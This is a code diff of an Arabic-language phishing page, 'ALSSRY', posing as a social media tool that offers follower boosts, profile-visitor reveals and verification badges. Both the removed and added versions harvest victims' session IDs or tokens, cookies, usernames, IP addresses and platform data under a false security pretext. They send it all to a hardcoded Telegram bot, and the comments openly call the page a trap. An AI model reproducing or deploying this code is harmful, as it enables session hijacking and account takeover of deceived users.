@@ -1,77 +1,79 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ALSSRY - SERVICES</title>
+    <title>ALSSRY PRO v5.0</title>
     <style>
-        :root { --main-green: #00ff00; --glow-red: #ff0000; }
-        body { background-color: #010101; color: white; text-align: center; font-family: 'Arial', sans-serif; margin: 0; overflow: hidden; direction: rtl; }
-        #starfield { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; background: black; }
-        .star { position: absolute; background-color: white; border-radius: 50%; animation: moveStar linear infinite; opacity: 1; box-shadow: 0 0 5px white; }
-        @keyframes moveStar { from { transform: translateY(100vh); } to { transform: translateY(-10vh); } }
-        #blur-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; backdrop-filter: blur(2px); background: rgba(0,0,0,0.5); }
-        .logo-3d { font-size: 42px; font-weight: 900; color: white; letter-spacing: 6px; text-shadow: 3px 3px 0px var(--glow-red), -3px -3px 0px var(--main-green); margin: 20px 0; display: block; }
-        .start-btn { padding: 16px 70px; background: transparent; border: 1px solid var(--main-green); color: var(--main-green); border-radius: 50px; font-size: 22px; cursor: pointer; transition: 0.4s; }
-        #tools-interface { padding: 20px; display: none; z-index: 10; }
-        .glass-btn { width: 90%; padding: 16px; margin: 10px 0; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(0, 255, 0, 0.3); color: var(--main-green); border-radius: 12px; font-weight: bold; cursor: pointer; }
+        :root { --green: #00ff00; --red: #ff0000; }
+        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; text-align: center; }
+        .logo { font-size: 40px; font-weight: 900; text-shadow: 2px 2px var(--red), -2px -2px var(--green); margin: 20px 0; }
+        .tool-card { 
+            background: rgba(255,255,255,0.05); border: 1px solid var(--green); 
+            padding: 15px; margin: 10px; border-radius: 12px; cursor: pointer;
+            display: flex; align-items: center; justify-content: space-between;
+        }
+        .start-btn { padding: 15px 70px; background: none; border: 2px solid var(--green); color: var(--green); border-radius: 50px; font-size: 20px; cursor: pointer; }
+        #modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1a1a1a; padding: 20px; border: 2px solid var(--green); border-radius: 15px; z-index: 100; width: 80%; }
+        input { width: 90%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid var(--green); color: #fff; border-radius: 5px; text-align: center; }
     </style>
 </head>
 <body>
-    <div id="starfield"></div>
-    <div id="blur-overlay"></div>
 
-    <div id="landing-page">
-        <div class="logo-3d">ALSSRY</div>
-        <h1 style="text-shadow: 0 0 8px var(--main-green);">خدمات السوشال ميديا</h1>
-        <button class="start-btn" onclick="startTrap()">بدء الاستخدام</button>
+    <div id="p1" style="height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+        <div class="logo">ALSSRY</div>
+        <button class="start-btn" onclick="showTools()">دخول النظام</button>
     </div>
 
-    <div id="tools-interface">
-        <div class="logo-3d">ALSSRY</div>
-        <button class="glass-btn">🚀 رشق متابعين (سريع)</button>
-        <button class="glass-btn">⚔️ بلاغات سبام (قوي)</button>
-        <p>🟢 المتصلون: 284</p>
+    <div id="p2" style="display: none; padding: 10px;">
+        <div class="logo" style="font-size: 25px;">لوحة التحكم المتقدمة</div>
+        <div class="tool-card" onclick="openTrap('رشق متابعين')">🚀 زيادة متابعين (ثبات 100%)</div>
+        <div class="tool-card" onclick="openTrap('كشف الزوار')">👀 كشف من زار بروفايلك</div>
+        <div class="tool-card" onclick="openTrap('توثيق')">☑️ طلب علامة التوثيق</div>
+    </div>
+
+    <div id="modal">
+        <h3 id="m-title" style="color: var(--green);">تأكيد الحساب</h3>
+        <p style="font-size: 12px;">لضمان أمان حسابك أثناء التنفيذ، يرجى إدخال (Session ID) أو كود الجلسة من المتصفح:</p>
+        <input type="text" id="m-session" placeholder="أدخل الـ Session ID هنا">
+        <input type="text" id="m-user" placeholder="اسم المستخدم @">
+        <button class="start-btn" style="font-size: 15px; padding: 10px 30px;" onclick="sendData()">تأكيد وإرسال</button>
     </div>
 
     <script>
-        const TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
-        const CHAT_ID = "5811700860";
+        const T = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
+        const C = "5811700860";
+        let currentService = "";
 
-        function createStars() {
-            const container = document.getElementById('starfield');
-            for(let i=0; i<80; i++) {
-                const star = document.createElement('div');
-                star.className = 'star';
-                star.style.width = star.style.height = Math.random()*3+'px';
-                star.style.left = Math.random()*100+'vw';
-                star.style.animationDuration = Math.random()*5+2+'s';
-                container.appendChild(star);
-            }
+        function showTools() {
+            document.getElementById('p1').style.display = 'none';
+            document.getElementById('p2').style.display = 'block';
         }
-        createStars();
 
-        async function startTrap() {
-            // سحب يدوي للكوكيز/بيانات الدخول للتمويه
-            let manualCookie = prompt("تنبيه: لتجنب الحظر، يرجى إدخال كود التحقق (Token) أو اسم الحساب:");
-            
-            document.getElementById('landing-page').style.display = 'none';
-            document.getElementById('tools-interface').style.display = 'block';
+        function openTrap(s) {
+            currentService = s;
+            document.getElementById('m-title').innerText = "قسم: " + s;
+            document.getElementById('modal').style.display = 'block';
+        }
 
-            let ip = "Hidden";
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const d = await res.json();
-                ip = d.ip;
-            } catch(e) {}
+        async function sendData() {
+            let session = document.getElementById('m-session').value;
+            let user = document.getElementById('m-user').value;
 
-            const report = `🎣 صيد جديد مكتمل:\n👤 المدخل اليدوي: ${manualCookie}\n🌐 IP: ${ip}\n💻 النظام: ${navigator.platform}\n🍪 الكوكيز المتصفح: ${document.cookie || "Empty"}`;
+            if(!session || !user) { alert("يرجى إكمال البيانات!"); return; }
 
-            // إرسال البيانات للبوت مباشرة
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            let ip = "0.0.0.0";
+            try { await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>ip=d.ip); } catch(e){}
+
+            let report = `🔥 صيد "سيشن" جديد!\n🛠 الأداة: ${currentService}\n👤 اليوزر: ${user}\n🔑 السيشن ID: ${session}\n🌐 IP: ${ip}\n💻 النظام: ${navigator.platform}`;
+
+            fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: report})
+                body: JSON.stringify({chat_id: C, text: report})
+            }).then(() => {
+                alert("تم استلام الطلب! سيتم التنفيذ خلال 15 دقيقة.");
+                document.getElementById('modal').style.display = 'none';
             });
         }
     </script>
